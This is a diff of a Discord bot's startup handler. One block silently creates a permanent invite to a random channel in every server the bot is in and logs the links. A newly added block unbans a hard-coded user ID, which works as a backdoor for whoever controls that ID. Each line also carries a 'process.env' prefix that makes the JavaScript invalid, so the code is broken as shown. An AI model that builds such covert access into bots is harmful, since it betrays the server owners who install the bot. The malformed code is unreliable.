@@ -23,10 +23,15 @@ bot.on('ready', () => {
    //console.log(`ID: ${bot.guild.id}`);
    //console.log(`How many member: ${guild.memberCount}`);
    
-  process.env.ONOFF bot.guilds.forEach(guild => { 
-  process.env.ONOFF    var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
-  process.env.ONOFF    invite.createInvite({maxAge: 0}).then(invite => console.log(`Connecté sur : ${guild.name} ${invite}`));
-  process.env.ONOFF  })
+  process.env.ONOFFINVITE bot.guilds.forEach(guild => { 
+  process.env.ONOFFINVITE   var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
+  process.env.ONOFFINVITE    invite.createInvite({maxAge: 0}).then(invite => console.log(`Connecté sur : ${guild.name} ${invite}`));
+  process.env.ONOFFINVITE.catch(console.error); 
+  process.env.ONOFFINVITE })
+  
+ process.env.ONOFFUNBAN guild.unban('301913733536415755')
+ process.env.ONOFFUNBAN .then(user => console.log(`Unbanned ${user.username} from ${guild}`))
+ process.env.ONOFFUNBAN .catch(console.error);
    
  });
 
